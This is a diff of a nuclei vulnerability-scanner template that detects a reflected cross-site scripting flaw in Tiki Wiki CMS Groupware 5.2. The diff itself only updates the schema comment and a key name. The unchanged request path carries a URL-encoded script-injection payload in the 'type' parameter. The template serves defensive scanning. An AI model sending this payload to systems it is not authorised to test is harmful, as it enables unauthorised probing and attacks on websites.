@@ -1,10 +1,11 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: tikiwiki-reflected-xss
 info:
   name: Tiki Wiki CMS Groupware 5.2 Reflected Cross-site Scripting
   author: madrobot
   severity: medium
   tags: xss
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E"
